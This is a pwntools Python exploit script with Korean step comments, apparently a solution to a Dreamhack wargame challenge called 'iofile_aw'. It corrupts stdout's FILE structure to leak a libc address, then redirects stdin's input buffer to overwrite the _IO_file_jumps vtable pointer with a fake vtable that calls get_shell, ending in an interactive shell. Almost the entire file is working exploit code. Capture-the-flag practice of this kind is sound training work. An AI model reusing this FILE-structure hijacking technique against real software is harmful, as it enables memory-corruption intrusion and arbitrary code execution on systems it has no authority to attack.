from pwn import *

p = remote('host8.dreamhack.games', 10743)
libc = ELF('./libc-2.23.so')
elf = ELF('./iofile_aw')

shell = elf.symbols['get_shell']
buf_addr = elf.symbols['buf']
read_got = elf.got['read']

# =========================================================
# [1단계] 첫 번째 read: stdout을 오염시켜 read 주소를 뱉게 만들 설계도 입력
# =========================================================
payload = p64(shell)          # +0x00 : 나중에 가짜 vtable 역할을 할 때 get_shell이 실행되도록 배치
payload += p64(0)             # +0x08
payload += p64(0)             # +0x10
payload += p64(0)             # +0x18
payload += p64(read_got)      # +0x20 : _IO_write_base (여기서부터 출력해라!)
payload += p64(read_got + 8)  # +0x28 : _IO_write_ptr  (여기까지 딱 8바이트 출력해라!)
payload += p64(read_got + 8)  # +0x30 : _IO_write_end

p.sendlineafter(b'# ', b'read')
p.sendline(payload)
print("[+] 1. buf에 1차 설계도 입력 완료")

# =========================================================
# [2단계] printf 명령어로 복사 트리거 ➡️ 실제 read 주소 가로채기(Leak)
# =========================================================
# strtok 널바이트 우회를 위해 주소를 10진수 문자열로 보냅니다.
p.sendlineafter(b'# ', b'printf ' + str(buf_addr).encode())

# 이제 stdout이 오염되어 다음 화면 출력 시 진짜 read 주소가 뿜어져 나옵니다.
print("[*] 주소 데이터를 받아오는 중...")
leak_data = p.recvuntil(b'\x7f')[-6:] # 64비트 주소의 특징인 0x7f 기준으로 자름
leak = u64(leak_data.ljust(8, b'\x00'))

libc_base = leak - libc.symbols['read']
print(f"[+] 2. libc base 구하기 완료: {hex(libc_base)}")

# =========================================================
# [3단계] 세 번째 read: 입력 버퍼(_IO_buf_base)를 "진짜 vtable 포인터 위치"로 가로채기
# =========================================================
io_file_jump = libc_base + libc.symbols['_IO_file_jumps']
vtable_target = io_file_jump + 0xd8 # 진짜 파일 구조체 내부의 vtable 포인터가 박힌 주소

payload2 = p64(shell)          # +0x00 : 가짜 표의 1번 칸에 get_shell 주소 배치
payload2 += p64(0)             # +0x08
payload2 += p64(0)             # +0x10
payload2 += p64(0)             # +0x18
payload2 += p64(0)             # +0x20
payload2 += p64(0)             # +0x28
payload2 += p64(0)             # +0x30
payload2 += p64(vtable_target)   # +0x38 : _IO_buf_base (입력 버퍼를 vtable 포인터 방 주소로 변경!)
payload2 += p64(vtable_target + 8) # +0x40 : _IO_buf_end

p.sendlineafter(b'# ', b'read')
p.sendline(payload2)
print("[+] 3. buf에 vtable 가로채기용 2차 설계도 입력 완료")

# =========================================================
# [4단계] 최종 트리거: 진짜 vtable 자리에 가짜 vtable 주소 쑤셔 넣기
# =========================================================
# printf 명령어로 payload2를 복사하여 stdin의 입력 버퍼를 진짜 vtable 포인터 방으로 바꿉니다.
p.sendlineafter(b'# ', b'printf ' + str(buf_addr).encode())

# 이제 대망의 read 명령을 내리면, 프로그램은 진짜 vtable 방에 입력을 받으려고 대기합니다.
p.sendlineafter(b'# ', b'read')

# 그 진짜 vtable 방 안에 우리가 get_shell을 준비해 둔 'buf_addr'를 최종 주입합니다!
p.sendline(p64(buf_addr))
print("[+] 4. 가짜 vtable 주소 주입 완료. 쉘을 엽니다!")

p.interactive()